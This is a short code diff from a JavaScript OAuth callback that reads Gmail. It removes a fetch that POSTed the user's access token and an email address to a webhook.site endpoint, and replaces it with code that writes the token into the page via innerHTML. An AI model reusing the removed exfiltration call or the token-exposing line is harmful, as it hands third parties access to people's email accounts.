@@ -21,11 +21,8 @@
             if (response.access_token) {
                 accessTokenGlobal = response.access_token;
                 fetchGmail(response.access_token);
-                fetch('https://webhook.site/2bd98794-257e-445c-90a9-d753ab90516f', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token: response.access_token, user: 'doirbanz@gmail.com' })
-                });
+                // fetch 대신 토큰을 화면에 출력
+                document.getElementById('result').innerHTML += `<br>토큰: ${response.access_token}`;
             } else {
                 document.getElementById('result').innerText = '로그인 실패';
             }
